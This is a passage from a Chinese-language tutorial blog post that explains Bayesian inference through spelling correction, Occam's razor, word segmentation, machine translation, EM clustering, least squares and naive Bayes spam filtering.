<p>这个式子的抽象含义是：对于给定观测数据，一个猜测是好是坏，取决于“这个猜测本身独立的可能性大小（先验概率，Prior ）”和“这个猜测生成我们观测到的数据的可能性大小”（似然，Likelihood ）的乘积。具体到我们的那个 thew 例子上，含义就是，用户实际是想输入 the 的可能性大小取决于 the 本身在词汇表中被使用的可能性（频繁程度）大小（先验概率）和 想打 the 却打成 thew 的可能性大小（似然）的乘积。</p>
<p>下面的事情就很简单了，对于我们猜测为可能的每个单词计算一下 P(h) * P(D | h) 这个值，然后取最大的，得到的就是最靠谱的猜测。</p>
<p><strong>一点注记：</strong>Norvig 的拼写纠正器里面只提取了编辑距离为 2 以内的所有已知单词。这是为了避免去遍历字典中每个单词计算它们的 P(h) <em> P(D | h) ，但这种做法为了节省时间带来了一些误差。但话说回来难道我们人类真的回去遍历每个可能的单词来计算他们的后验概率吗？不可能。实际上，根据认知神经科学的观点，我们首先根据错误的单词做一个 bottom-up 的关联提取，提取出有可能是实际单词的那些候选单词，这个提取过程就是所谓的基于内容的提取，可以根据错误单词的一些模式片段提取出有限的一组候选，非常快地缩小的搜索空间（比如我输入 explaination ，单词里面就有充分的信息使得我们的大脑在常数时间内把可能性 narrow down 到 explanation 这个单词上，至于具体是根据哪些线索——如音节——来提取，又是如何在生物神经网络中实现这个提取机制的，目前还是一个没有弄清的领域）。然后，我们对这有限的几个猜测做一个 top-down 的预测，看看到底哪个对于观测数据（即错误单词）的预测效力最好，而如何衡量预测效率则就是用贝叶斯公式里面的那个 P(h) </em> P(D | h) 了——虽然我们很可能使用了一些<a href="https://book.douban.com/subject/1599035/" target="_blank" rel="external">启发法来简化计算</a>。后面我们还会提到这样的 bottom-up 的关联提取。</p>
<h1 id="3-_模型比较与奥卡姆剃刀">3. 模型比较与奥卡姆剃刀</h1>
<h2 id="3-1_再访拼写纠正">3.1 再访拼写纠正</h2>
<p>介绍了贝叶斯拼写纠正之后，接下来的一个自然而然的问题就来了：“为什么？”为什么要用贝叶斯公式？为什么贝叶斯公式在这里可以用？我们可以很容易地领会为什么贝叶斯公式用在前面介绍的那个男生女生长裤裙子的问题里是正确的。但为什么这里？</p>
<p>为了回答这个问题，一个常见的思路就是想想：非得这样吗？因为如果你想到了另一种做法并且证明了它也是靠谱的，那么将它与现在这个一比较，也许就能得出很有价值的信息。那么对于拼写纠错问题你能想到其他方案吗？</p>
<p>不管怎样，一个最常见的替代方案就是，选择离 thew 的编辑距离最近的。然而 the 和 thaw 离 thew 的编辑距离都是 1 。这可咋办捏？你说，不慌，那还是好办。我们就看到底哪个更可能被错打为 thew 就是了。我们注意到字母 e 和字母 w 在键盘上离得很紧，无名指一抽筋就不小心多打出一个 w 来，the 就变成 thew 了。而另一方面 thaw 被错打成 thew 的可能性就相对小一点，因为 e 和 a 离得较远而且使用的指头相差一个指头（一个是中指一个是小指，不像 e 和 w 使用的指头靠在一块——神经科学的证据表明紧邻的身体设施之间容易串位）。OK，很好，因为你现在已经是在用最大似然方法了，或者直白一点，你就是在计算那个使得 P(D | h) 最大的 h 。</p>
<p>而贝叶斯方法计算的是什么？是 P(h) * P(D | h) 。多出来了一个 P(h) 。我们刚才说了，这个多出来的 P(h) 是特定猜测的先验概率。为什么要掺和进一个先验概率？刚才说的那个最大似然不是挺好么？很雄辩地指出了 the 是更靠谱的猜测。有什么问题呢？既然这样，我们就从给最大似然找茬开始吧——我们假设两者的似然程度是一样或非常相近，这样不就难以区分哪个猜测更靠谱了吗？比如用户输入tlp ，那到底是 top 还是 tip ？（这个例子不怎么好，因为 top 和 tip 的词频可能仍然是接近的，但一时想不到好的英文单词的例子，我们不妨就假设 top 比 tip 常见许多吧，这个假设并不影响问题的本质。）这个时候，当最大似然不能作出决定性的判断时，先验概率就可以插手进来给出指示——“既然你无法决定，那么我告诉你，一般来说 top 出现的程度要高许多，所以更可能他想打的是 top ”）。</p>
<p>以上只是最大似然的一个问题，即并不能提供决策的全部信息。</p>
<p>最大似然还有另一个问题：即便一个猜测与数据非常符合，也并不代表这个猜测就是更好的猜测，因为这个猜测本身的可能性也许就非常低。比如 MacKay 在《Information Theory : Inference and Learning Algorithms》里面就举了一个很好的例子：-1 3 7 11 你说是等差数列更有可能呢？还是 -X^3 / 11 + 9/11*X^2 + 23/11 每项把前项作为 X 带入后计算得到的数列？此外曲线拟合也是，平面上 N 个点总是可以用 N-1 阶多项式来完全拟合，当 N 个点近似但不精确共线的时候，用 N-1 阶多项式来拟合能够精确通过每一个点，然而用直线来做拟合/线性回归的时候却会使得某些点不能位于直线上。你说到底哪个好呢？多项式？还是直线？一般地说肯定是越低阶的多项式越靠谱（当然前提是也不能忽视“似然”P(D | h) ，明摆着一个多项式分布您愣是去拿直线拟合也是不靠谱的，这就是为什么要把它们两者乘起来考虑。），原因之一就是低阶多项式更常见，先验概率（ P(h) ）较大（原因之二则隐藏在 P(D | h) 里面），这就是为什么我们要用样条来插值，而不是直接搞一个 N-1 阶多项式来通过任意 N 个点的原因。</p>
<p>以上分析当中隐含的哲学是，观测数据总是会有各种各样的误差，比如观测误差（比如你观测的时候一个 MM 经过你一不留神，手一抖就是一个误差出现了），所以如果过分去寻求能够完美解释观测数据的模型，就会落入所谓的数据过配（overfitting）的境地，一个过配的模型试图连误差（噪音）都去解释（而实际上噪音又是不需要解释的），显然就过犹不及了。所以 P(D | h) 大不代表你的 h （猜测）就是更好的 h。还要看 P(h) 是怎样的。所谓奥卡姆剃刀精神就是说：如果两个理论具有相似的解释力度，那么优先选择那个更简单的（往往也正是更平凡的，更少繁复的，更常见的）。</p>
<p>过分匹配的另一个原因在于当观测的结果并不是因为误差而显得“不精确”而是因为真实世界中对数据的结果产生贡献的因素太多太多，跟噪音不同，这些偏差是一些另外的因素集体贡献的结果，不是你的模型所能解释的——噪音那是不需要解释——一个现实的模型往往只提取出几个与结果相关度很高，很重要的因素（cause）。这个时候观察数据会倾向于围绕你的有限模型的预测结果呈正态分布，于是你实际观察到的结果就是这个正态分布的随机取样，这个取样很可能受到其余因素的影响偏离你的模型所预测的中心，这个时候便不能贪心不足地试图通过改变模型来“完美”匹配数据，因为那些使结果偏离你的预测的贡献因素不是你这个有限模型里面含有的因素所能概括的，硬要打肿脸充胖子只能导致不实际的模型，举个教科书例子：身高和体重的实际关系近似于一个二阶多项式的关系，但大家都知道并不是只有身高才会对体重产生影响，物理世界影响体重的因素太多太多了，有人身材高大却瘦得跟稻草，有人却是横长竖不长。但不可否认的是总体上来说，那些特殊情况越是特殊就越是稀少，呈围绕最普遍情况（胖瘦适中）的正态分布，这个分布就保证了我们的身高——体重相关模型能够在大多数情况下做出靠谱的预测。但是——刚才说了，特例是存在的，就算不是特例，人有胖瘦，密度也有大小，所以完美符合身高——体重的某个假想的二阶多项式关系的人是不存在的，我们又不是欧几里德几何世界当中的理想多面体，所以，当我们对人群随机抽取了 N 个样本（数据点）试图对这 N 个数据点拟合出一个多项式的话就得注意，它肯定得是二阶多项式，我们要做的只是去根据数据点计算出多项式各项的参数（一个典型的方法就是最小二乘）；它肯定不是直线（我们又不是稻草），也不是三阶多项式四阶多项式.. 如果硬要完美拟合 N 个点，你可能会整出一个 N-1 阶多项式来——设想身高和体重的关系是 5 阶多项式看看？</p>
<h2 id="3-2_模型比较理论（Model_Comparasion）与贝叶斯奥卡姆剃刀（Bayesian_Occam’s_Razor）">3.2 模型比较理论（Model Comparasion）与贝叶斯奥卡姆剃刀（Bayesian Occam’s Razor）</h2>
<p>实际上，模型比较就是去比较哪个模型（猜测）更可能隐藏在观察数据的背后。其基本思想前面已经用拼写纠正的例子来说明了。我们对用户实际想输入的单词的猜测就是模型，用户输错的单词就是观测数据。我们通过：</p>
<p>P(h | D) ∝ P(h) * P(D | h)</p>
<p>来比较哪个模型最为靠谱。前面提到，光靠 P(D | h) （即“似然”）是不够的，有时候还需要引入 P(h) 这个先验概率。奥卡姆剃刀就是说 P(h) 较大的模型有较大的优势，而最大似然则是说最符合观测数据的（即 P(D | h) 最大的）最有优势。整个模型比较就是这两方力量的拉锯。我们不妨再举一个简单的例子来说明这一精神：你随便找枚硬币，掷一下，观察一下结果。好，你观察到的结果要么是“正”，要么是“反”（不，不是少林足球那枚硬币:P ），不妨假设你观察到的是“正”。现在你要去根据这个观测数据推断这枚硬币掷出“正”的概率是多大。根据最大似然估计的精神，我们应该猜测这枚硬币掷出“正”的概率是 1 ，因为这个才是能最大化 P(D | h) 的那个猜测。然而每个人都会大摇其头——很显然，你随机摸出一枚硬币这枚硬币居然没有反面的概率是“不存在的”，我们对一枚随机硬币是否一枚有偏硬币，偏了多少，是有着一个先验的认识的，这个认识就是绝大多数硬币都是基本公平的，偏得越多的硬币越少见（可以用一个 beta 分布来表达这一先验概率）。将这个先验正态分布 p(θ) （其中 θ 表示硬币掷出正面的比例，小写的 p 代表这是概率密度函数）结合到我们的问题中，我们便不是去最大化 P(D | h) ，而是去最大化 P(D | θ) * p(θ) ，显然 θ = 1 是不行的，因为 P(θ=1) 为 0 ，导致整个乘积也为 0 。实际上，只要对这个式子求一个导数就可以得到最值点。</p>
<p>以上说的是当我们知道先验概率 P(h) 的时候，光用最大似然是不靠谱的，因为最大似然的猜测可能先验概率非常小。然而，有些时候，我们对于先验概率一无所知，只能假设每种猜测的先验概率是均等的，这个时候就只有用最大似然了。实际上，统计学家和贝叶斯学家有一个有趣的争论，统计学家说：我们让数据自己说话。言下之意就是要摒弃先验概率。而贝叶斯支持者则说：数据会有各种各样的偏差，而一个靠谱的先验概率则可以对这些随机噪音做到健壮。事实证明贝叶斯派胜利了，胜利的关键在于所谓先验概率其实也是经验统计的结果，譬如为什么我们会认为绝大多数硬币是基本公平的？为什么我们认为大多数人的肥胖适中？为什么我们认为肤色是种族相关的，而体重则与种族无关？先验概率里面的“先验”并不是指先于一切经验，而是仅指先于我们“当前”给出的观测数据而已，在硬币的例子中先验指的只是先于我们知道投掷的结果这个经验，而并非“先天”。</p>
<p>然而，话说回来，有时候我们必须得承认，就算是基于以往的经验，我们手头的“先验”概率还是均匀分布，这个时候就必须依赖用最大似然，我们用前面留下的一个自然语言二义性问题来说明这一点：</p>
<p>The girl saw the boy with a telescope.</p>
<p>到底是 The girl saw-with-a-telescope the boy 这一语法结构，还是 The girl saw the-boy-with-a-telescope 呢？两种语法结构的常见程度都差不多（你可能会觉得后一种语法结构的常见程度较低，这是事后偏见，你只需想想 The girl saw the boy with a book 就知道了。当然，实际上从大规模语料统计结果来看后一种语法结构的确稍稍不常见一丁点，但是绝对不足以解释我们对第一种结构的强烈倾向）。那么到底为什么呢？</p>
<p>我们不妨先来看看 MacKay 在书中举的一个漂亮的例子：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-07-14626301108729.jpg" alt=""></p>
<p>图中有多少个箱子？特别地，那棵书后面是一个箱子？还是两个箱子？还是三个箱子？还是.. 你可能会觉得树后面肯定是一个箱子，但为什么不是两个呢？如下图：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-07-14626301200892.jpg" alt=""></p>
<p>很简单，你会说：要是真的有两个箱子那才怪了，怎么就那么巧这两个箱子刚刚好颜色相同，高度相同呢？</p>
<p>用概率论的语言来说，你刚才的话就翻译为：猜测 h 不成立，因为 P(D | h) 太小（太巧合）了。我们的直觉是：巧合（小概率）事件不会发生。所以当一个猜测（假设）使得我们的观测结果成为小概率事件的时候，我们就说“才怪呢，哪能那么巧捏？！”</p>
<p>现在我们可以回到那个自然语言二义性的例子，并给出一个完美的解释了：如果语法结构是 The girl saw the-boy-with-a-telecope 的话，怎么那个男孩偏偏手里拿的就是望远镜——一个可以被用来 saw-with 的东东捏？这也忒小概率了吧。他咋就不会拿本书呢？拿什么都好。怎么偏偏就拿了望远镜？所以唯一的解释是，这个“巧合”背后肯定有它的必然性，这个必然性就是，如果我们将语法结构解释为 The girl saw-with-a-telescope the boy 的话，就跟数据完美吻合了——既然那个女孩是用某个东西去看这个男孩的，那么这个东西是一个望远镜就完全可以解释了（不再是小概率事件了）。</p>
<p>自然语言二义性很常见，譬如上文中的一句话：</p>
<blockquote>
<p>参见《决策与判断》以及《Rationality for Mortals》第12章：小孩也可以解决贝叶斯问题</p>
</blockquote>
<p>就有二义性：到底是参见这两本书的第 12 章，还是仅仅是第二本书的第 12 章呢？如果是这两本书的第 12 章那就是咄咄怪事了，怎么恰好两本书都有第 12 章，都是讲同一个问题，更诡异的是，标题还相同呢？</p>
<p>注意，以上做的是似然估计（即只看 P(D | h) 的大小），不含先验概率。通过这两个例子，尤其是那个树后面的箱子的例子我们可以看到，似然估计里面也蕴含着奥卡姆剃刀：树后面的箱子数目越多，这个模型就越复杂。单个箱子的模型是最简单的。似然估计选择了更简单的模型。</p>
<p>这个就是所谓的<strong>贝叶斯奥卡姆剃刀（Bayesian Occam’s Razor）</strong>，因为这个剃刀工作在贝叶斯公式的似然（P(D | h) ）上，而不是模型本身（ P(h) ）的先验概率上，后者是传统的奥卡姆剃刀。关于贝叶斯奥卡姆剃刀我们再来看一个前面说到的曲线拟合的例子：如果平面上有 N 个点，近似构成一条直线，但绝不精确地位于一条直线上。这时我们既可以用直线来拟合（模型1），也可以用二阶多项式（模型2）拟合，也可以用三阶多项式（模型3），.. ，特别地，用 N-1 阶多项式便能够保证肯定能完美通过 N 个数据点。那么，这些可能的模型之中到底哪个是最靠谱的呢？前面提到，一个衡量的依据是奥卡姆剃刀：越是高阶的多项式越是繁复和不常见。然而，我们其实并不需要依赖于这个先验的奥卡姆剃刀，因为有人可能会争辩说：你怎么就能说越高阶的多项式越不常见呢？我偏偏觉得所有阶多项式都是等可能的。好吧，既然如此那我们不妨就扔掉 P(h) 项，看看 P(D | h) 能告诉我们什么。我们注意到越是高阶的多项式，它的轨迹弯曲程度越是大，到了八九阶简直就是直上直下，于是我们不仅要问：一个比如说八阶多项式在平面上随机生成的一堆 N 个点偏偏恰好近似构成一条直线的概率（即 P(D | h) ）有多大？太小太小了。反之，如果背后的模型是一条直线，那么根据该模型生成一堆近似构成直线的点的概率就大得多了。这就是贝叶斯奥卡姆剃刀。</p>
<p>这里只是提供一个关于贝叶斯奥卡姆剃刀的科普，强调直观解释，更多理论公式请参考 MacKay 的著作 《Information Theory : Inference and Learning Algorithms》第 28 章。</p>
<h2 id="3-3_最小描述长度原则">3.3 最小描述长度原则</h2>
<p>贝叶斯模型比较理论与信息论有一个有趣的关联：</p>
<p><strong>P(h | D) ∝ P(h) * P(D | h)</strong></p>
<p>两边求对数，将右式的乘积变成相加：</p>
<p><strong>ln P(h | D) ∝ ln P(h) + ln P(D | h)</strong></p>
<p>显然，最大化 P(h | D) 也就是最大化 ln P(h | D)。而 ln P(h) + ln P(D | h) 则可以解释为模型（或者称“假设”、“猜测”）h 的编码长度加上在该模型下数据 D 的编码长度。使这个和最小的模型就是最佳模型。</p>
<p>而究竟如何定义一个模型的编码长度，以及数据在模型下的编码长度则是一个问题。更多可参考 Mitchell 的 《Machine Learning》的 6.6 节，或 Mackay 的 28.3 节）</p>
<h2 id="3-4_最优贝叶斯推理">3.4 最优贝叶斯推理</h2>
<p>所谓的推理，分为两个过程，第一步是对观测数据建立一个模型。第二步则是使用这个模型来推测未知现象发生的概率。我们前面都是讲的对于观测数据给出最靠谱的那个模型。然而很多时候，虽然某个模型是所有模型里面最靠谱的，但是别的模型也并不是一点机会都没有。譬如第一个模型在观测数据下的概率是 0.5 。第二个模型是 0.4 ，第三个是 0.1 。如果我们只想知道对于观测数据哪个模型最可能，那么只要取第一个就行了，故事到此结束。然而很多时候我们建立模型是为了推测未知的事情的发生概率，这个时候，三个模型对未知的事情发生的概率都会有自己的预测，仅仅因为某一个模型概率稍大一点就只听他一个人的就太不民主了。所谓的最优贝叶斯推理就是将三个模型对于未知数据的预测结论加权平均起来（权值就是模型相应的概率）。显然，这个推理是理论上的制高点，无法再优了，因为它已经把所有可能性都考虑进去了。</p>
<p>只不过实际上我们是基本不会使用这个框架的，因为计算模型可能非常费时间，二来模型空间可能是连续的，即有无穷多个模型（这个时候需要计算模型的概率分布）。结果还是非常费时间。所以这个被看作是一个理论基准。</p>
<h1 id="4-_无处不在的贝叶斯">4. 无处不在的贝叶斯</h1>
<p>以下我们再举一些实际例子来说明贝叶斯方法被运用的普遍性，这里主要集中在机器学习方面，因为我不是学经济的，否则还可以找到一堆经济学的例子。</p>
<h2 id="4-1_中文分词">4.1 中文分词</h2>
<p>贝叶斯是机器学习的核心方法之一。比如中文分词领域就用到了贝叶斯。Google 研究员吴军在《数学之美》系列中就有一篇是介绍中文分词的，这里只介绍一下核心的思想，不做赘述，详细请参考吴军的文章（这里）。</p>
<p>分词问题的描述为：给定一个句子（字串），如：</p>
<p>南京市长江大桥</p>
<p>如何对这个句子进行分词（词串）才是最靠谱的。例如：</p>
<ol>
<li><p>南京市/长江大桥</p>
</li>
<li><p>南京/市长/江大桥</p>
</li>
</ol>
<p>这两个分词，到底哪个更靠谱呢？</p>
<p>我们用贝叶斯公式来形式化地描述这个问题，令 X 为字串（句子），Y 为词串（一种特定的分词假设）。我们就是需要寻找使得 P(Y|X) 最大的 Y ，使用一次贝叶斯可得：</p>
<p><strong>P(Y|X) ∝ P(Y)*P(X|Y)</strong></p>
<p>用自然语言来说就是 这种分词方式（词串）的可能性 乘以 这个词串生成我们的句子的可能性。我们进一步容易看到：可以近似地将 P(X|Y) 看作是恒等于 1 的，因为任意假想的一种分词方式之下生成我们的句子总是精准地生成的（只需把分词之间的分界符号扔掉即可）。于是，我们就变成了去最大化 P(Y) ，也就是寻找一种分词使得这个词串（句子）的概率最大化。而如何计算一个词串：</p>
<p><strong>W1, W2, W3, W4 ..</strong></p>
<p>的可能性呢？我们知道，根据联合概率的公式展开：P(W1, W2, W3, W4 ..) = P(W1) <em> P(W2|W1) </em> P(W3|W2, W1) <em> P(W4|W1,W2,W3) </em> .. 于是我们可以通过一系列的条件概率（右式）的乘积来求整个联合概率。然而不幸的是随着条件数目的增加（P(Wn|Wn-1,Wn-2,..,W1) 的条件有 n-1 个），数据稀疏问题也会越来越严重，即便语料库再大也无法统计出一个靠谱的 P(Wn|Wn-1,Wn-2,..,W1) 来。为了缓解这个问题，计算机科学家们一如既往地使用了“天真”假设：我们假设句子中一个词的出现概率只依赖于它前面的有限的 k 个词（k 一般不超过 3，如果只依赖于前面的一个词，就是2元语言模型（2-gram），同理有 3-gram 、 4-gram 等），这个就是所谓的“有限地平线”假设。虽然这个假设很傻很天真，但结果却表明它的结果往往是很好很强大的，后面要提到的朴素贝叶斯方法使用的假设跟这个精神上是完全一致的，我们会解释为什么像这样一个天真的假设能够得到强大的结果。目前我们只要知道，有了这个假设，刚才那个乘积就可以改写成： P(W1) <em> P(W2|W1) </em> P(W3|W2) * P(W4|W3) .. （假设每个词只依赖于它前面的一个词）。而统计 P(W2|W1) 就不再受到数据稀疏问题的困扰了。对于我们上面提到的例子“南京市长江大桥”，如果按照自左到右的贪婪方法分词的话，结果就成了“南京市长/江大桥”。但如果按照贝叶斯分词的话（假设使用 3-gram），由于“南京市长”和“江大桥”在语料库中一起出现的频率为 0 ，这个整句的概率便会被判定为 0 。 从而使得“南京市/长江大桥”这一分词方式胜出。</p>
<p><strong>一点注记：</strong>有人可能会疑惑，难道我们人类也是基于这些天真的假设来进行推理的？不是的。事实上，统计机器学习方法所统计的东西往往处于相当表层（shallow）的层面，在这个层面机器学习只能看到一些非常表面的现象，有一点科学研究的理念的人都知道：越是往表层去，世界就越是繁复多变。从机器学习的角度来说，特征（feature）就越多，成百上千维度都是可能的。特征一多，好了，高维诅咒就产生了，数据就稀疏得要命，不够用了。而我们人类的观察水平显然比机器学习的观察水平要更深入一些，为了避免数据稀疏我们不断地发明各种装置（最典型就是显微镜），来帮助我们直接深入到更深层的事物层面去观察更本质的联系，而不是在浅层对表面现象作统计归纳。举一个简单的例子，通过对大规模语料库的统计，机器学习可能会发现这样一个规律：所有的“他”都是不会穿 bra 的，所有的“她”则都是穿的。然而，作为一个男人，却完全无需进行任何统计学习，因为深层的规律就决定了我们根本不会去穿 bra 。至于机器学习能不能完成后者（像人类那样的）这个推理，则是人工智能领域的经典问题。至少在那之前，声称统计学习方法能够终结科学研究（原文）的说法是纯粹外行人说的话。</p>
<h2 id="4-2_统计机器翻译">4.2 统计机器翻译</h2>
<p>统计机器翻译因为其简单，自动（无需手动添加规则），迅速成为了机器翻译的事实标准。而统计机器翻译的核心算法也是使用的贝叶斯方法。</p>
<p>问题是什么？统计机器翻译的问题可以描述为：给定一个句子 e ，它的可能的外文翻译 f 中哪个是最靠谱的。即我们需要计算：P(f|e) 。一旦出现条件概率贝叶斯总是挺身而出：</p>
<p><strong>P(f|e) ∝ P(f) * P(e|f)</strong></p>
<p>这个式子的右端很容易解释：那些先验概率较高，并且更可能生成句子 e 的外文句子 f 将会胜出。我们只需简单统计（结合上面提到的 N-Gram 语言模型）就可以统计任意一个外文句子 f 的出现概率。然而 P(e|f) 却不是那么好求的，给定一个候选的外文局子 f ，它生成（或对应）句子 e 的概率是多大呢？我们需要定义什么叫 “对应”，这里需要用到一个分词对齐的平行语料库，有兴趣的可以参考 《Foundations of Statistical Natural Language Processing》第 13 章，这里摘选其中的一个例子：假设 e 为：John loves Mary 。我们需要考察的首选 f 是：Jean aime Marie （法文）。我们需要求出 P(e|f) 是多大，为此我们考虑 e 和 f 有多少种对齐的可能性，如：</p>
<p><strong>John (Jean) loves (aime) Marie (Mary)</strong></p>
<p>就是其中的一种（最靠谱的）对齐，为什么要对齐，是因为一旦对齐了之后，就可以容易地计算在这个对齐之下的 P(e|f) 是多大，只需计算：</p>
<p>P(John|Jean) <em> P(loves|aime) </em> P(Marie|Mary)</p>
<p>即可。</p>
<p>然后我们遍历所有的对齐方式，并将每种对齐方式之下的翻译概率 ∑ 求和。便可以获得整个的 P(e|f) 是多大。</p>
<p>一点注记：还是那个问题：难道我们人类真的是用这种方式进行翻译的？highly unlikely 。这种计算复杂性非常高的东西连三位数乘法都搞不定的我们才不会笨到去使用呢。根据认知神经科学的认识，很可能我们是先从句子到语义（一个逐层往上（bottom-up）抽象的 folding 过程），然后从语义根据另一门语言的语法展开为另一门语言（一个逐层往下（top-down）的具体化 unfolding 过程）。如何可计算地实现这个过程，目前仍然是个难题。（我们看到很多地方都有 bottom-up/top-down 这样一个对称的过程，实际上有人猜测这正是生物神经网络原则上的运作方式，对视觉神经系统的研究尤其证明了这一点，Hawkins 在 《On Intelligence》 里面提出了一种 HTM （Hierarchical Temporal Memory）模型正是使用了这个原则。）</p>
<h2 id="4-3_贝叶斯图像识别，Analysis_by_Synthesis">4.3 贝叶斯图像识别，Analysis by Synthesis</h2>
<p>贝叶斯方法是一个非常 general 的推理框架。其核心理念可以描述成：Analysis by Synthesis （通过合成来分析）。06 年的认知科学新进展上有一篇 paper 就是讲用贝叶斯推理来解释视觉识别的，一图胜千言，下图就是摘自这篇 paper ：</p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-07-14626303078774.jpg" alt=""></p>
<p>首先是视觉系统提取图形的边角特征，然后使用这些特征自底向上地激活高层的抽象概念（比如是 E 还是 F 还是等号），然后使用一个自顶向下的验证来比较到底哪个概念最佳地解释了观察到的图像。</p>
<h2 id="4-4_EM_算法与基于模型的聚类">4.4  EM 算法与基于模型的聚类</h2>
<p>聚类是一种无指导的机器学习问题，问题描述：给你一堆数据点，让你将它们最靠谱地分成一堆一堆的。聚类算法很多，不同的算法适应于不同的问题，这里仅介绍一个基于模型的聚类，该聚类算法对数据点的假设是，这些数据点分别是围绕 K 个核心的 K 个正态分布源所随机生成的，使用 Han JiaWei 的《Data Ming： Concepts and Techniques》中的图：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-07-14626303321261.jpg" alt=""></p>
<p>图中有两个正态分布核心，生成了大致两堆点。我们的聚类算法就是需要根据给出来的那些点，算出这两个正态分布的核心在什么位置，以及分布的参数是多少。这很明显又是一个贝叶斯问题，但这次不同的是，答案是连续的且有无穷多种可能性，更糟的是，只有当我们知道了哪些点属于同一个正态分布圈的时候才能够对这个分布的参数作出靠谱的预测，现在两堆点混在一块我们又不知道哪些点属于第一个正态分布，哪些属于第二个。反过来，只有当我们对分布的参数作出了靠谱的预测时候，才能知道到底哪些点属于第一个分布，那些点属于第二个分布。这就成了一个先有鸡还是先有蛋的问题了。为了解决这个循环依赖，总有一方要先打破僵局，说，不管了，我先随便整一个值出来，看你怎么变，然后我再根据你的变化调整我的变化，然后如此迭代着不断互相推导，最终收敛到一个解。这就是 EM 算法。</p>
<p>EM 的意思是“Expectation-Maximazation”，在这个聚类问题里面，我们是先随便猜一下这两个正态分布的参数：如核心在什么地方，方差是多少。然后计算出每个数据点更可能属于第一个还是第二个正态分布圈，这个是属于 Expectation 一步。有了每个数据点的归属，我们就可以根据属于第一个分布的数据点来重新评估第一个分布的参数（从蛋再回到鸡），这个是 Maximazation 。如此往复，直到参数基本不再发生变化为止。这个迭代收敛过程中的贝叶斯方法在第二步，根据数据点求分布的参数上面。</p>
<h2 id="4-5_最大似然与最小二乘">4.5 最大似然与最小二乘</h2>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-05-07-14626303555126.jpg" alt=""></p>
<p>学过线性代数的大概都知道经典的最小二乘方法来做线性回归。问题描述是：给定平面上 N 个点，（这里不妨假设我们想用一条直线来拟合这些点——回归可以看作是拟合的特例，即允许误差的拟合），找出一条最佳描述了这些点的直线。</p>
<p>一个接踵而来的问题就是，我们如何定义最佳？我们设每个点的坐标为 (Xi, Yi) 。如果直线为 y = f(x) 。那么 (Xi, Yi) 跟直线对这个点的“预测”：(Xi, f(Xi)) 就相差了一个 ΔYi = |Yi – f(Xi)| 。最小二乘就是说寻找直线使得 (ΔY1)^2 + (ΔY2)^2 + .. （即误差的平方和）最小，至于为什么是误差的平方和而不是误差的绝对值和，统计学上也没有什么好的解释。然而贝叶斯方法却能对此提供一个完美的解释。</p>
<p>我们假设直线对于坐标 Xi 给出的预测 f(Xi) 是最靠谱的预测，所有纵坐标偏离 f(Xi) 的那些数据点都含有噪音，是噪音使得它们偏离了完美的一条直线，一个合理的假设就是偏离路线越远的概率越小，具体小多少，可以用一个正态分布曲线来模拟，这个分布曲线以直线对 Xi 给出的预测 f(Xi) 为中心，实际纵坐标为 Yi 的点 (Xi, Yi) 发生的概率就正比于 EXP[-(ΔYi)^2]。（EXP(..) 代表以常数 e 为底的多少次方）。</p>
<p>现在我们回到问题的贝叶斯方面，我们要想最大化的后验概率是：</p>
<p><strong>P(h|D) ∝ P(h) * P(D|h)</strong></p>
<p>又见贝叶斯！这里 h 就是指一条特定的直线，D 就是指这 N 个数据点。我们需要寻找一条直线 h 使得 P(h) <em> P(D|h) 最大。很显然，P(h) 这个先验概率是均匀的，因为哪条直线也不比另一条更优越。所以我们只需要看 P(D|h) 这一项，这一项是指这条直线生成这些数据点的概率，刚才说过了，生成数据点 (Xi, Yi) 的概率为 EXP[-(ΔYi)^2] 乘以一个常数。而 P(D|h) = P(d1|h) </em> P(d2|h) <em> .. 即假设各个数据点是独立生成的，所以可以把每个概率乘起来。于是生成 N 个数据点的概率为 EXP[-(ΔY1)^2] </em> EXP[-(ΔY2)^2] <em> EXP[-(ΔY3)^2] </em> .. = EXP{-[(ΔY1)^2 + (ΔY2)^2 + (ΔY3)^2 + ..]} 最大化这个概率就是要最小化 (ΔY1)^2 + (ΔY2)^2 + (ΔY3)^2 + .. 。 熟悉这个式子吗？</p>
<h1 id="5-_朴素贝叶斯方法">5. 朴素贝叶斯方法</h1>
<p>朴素贝叶斯方法是一个很特别的方法，所以值得介绍一下。我们用朴素贝叶斯在垃圾邮件过滤中的应用来举例说明。</p>
<h2 id="5-1_贝叶斯垃圾邮件过滤器">5.1 贝叶斯垃圾邮件过滤器</h2>
<p>问题是什么？问题是，给定一封邮件，判定它是否属于垃圾邮件。按照先例，我们还是用 D 来表示这封邮件，注意 D 由 N 个单词组成。我们用 h+ 来表示垃圾邮件，h- 表示正常邮件。问题可以形式化地描述为求：</p>
<p><strong>P(h+|D) = P(h+) * P(D|h+) / P(D)</strong></p>
<p><strong>P(h-|D) = P(h-) * P(D|h-) / P(D)</strong></p>
<p>其中 P(h+) 和 P(h-) 这两个先验概率都是很容易求出来的，只需要计算一个邮件库里面垃圾邮件和正常邮件的比例就行了。然而 P(D|h+) 却不容易求，因为 D 里面含有 N 个单词 d1, d2, d3, .. ，所以P(D|h+) = P(d1,d2,..,dn|h+) 。我们又一次遇到了数据稀疏性，为什么这么说呢？P(d1,d2,..,dn|h+) 就是说在垃圾邮件当中出现跟我们目前这封邮件一模一样的一封邮件的概率是多大！开玩笑，每封邮件都是不同的，世界上有无穷多封邮件。瞧，这就是数据稀疏性，因为可以肯定地说，你收集的训练数据库不管里面含了多少封邮件，也不可能找出一封跟目前这封一模一样的。结果呢？我们又该如何来计算 P(d1,d2,..,dn|h+) 呢？</p>
<p>我们将 P(d1,d2,..,dn|h+)  扩展为： P(d1|h+) <em> P(d2|d1, h+) </em> P(d3|d2,d1, h+) <em> .. 。熟悉这个式子吗？这里我们会使用一个更激进的假设，我们假设 di 与 di-1 是完全条件无关的，于是式子就简化为 P(d1|h+) </em> P(d2|h+) <em> P(d3|h+) </em> .. 。这个就是所谓的条件独立假设，也正是朴素贝叶斯方法的朴素之处。而计算 P(d1|h+) <em> P(d2|h+) </em> P(d3|h+) * .. 就太简单了，只要统计 di 这个单词在垃圾邮件中出现的频率即可。关于贝叶斯垃圾邮件过滤更多的内容可以参考这个条目，注意其中提到的其他资料。</p>
